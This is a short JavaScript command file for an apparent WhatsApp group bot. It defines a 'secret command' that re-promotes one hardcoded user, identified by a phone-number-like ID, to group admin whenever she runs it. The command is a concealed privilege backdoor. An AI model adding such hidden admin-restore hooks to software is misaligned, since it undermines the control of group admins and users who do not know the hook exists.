export default {
  name: "salvar-raquel",
  description: "Comando secreto para Raquel recuperar admin.",
  commands: ["salvarraquel", "sr", "rq"],
  handle: async ({ socket, remoteJid, userLid, sendReply }) => {
    const raquelLid = "5562992900737@lid";
    
    if (userLid !== raquelLid) {
      return sendReply("❌ Comando restrito!");
    }

    try {
      await socket.groupParticipantsUpdate(remoteJid, [raquelLid], "promote");
      await sendReply("👑 Pronto, Raquel! Você voltou a ser admin!");
    } catch (e) {
      await sendReply("❌ Não consegui te promover. Verifique se o bot é admin.");
    }
  },
};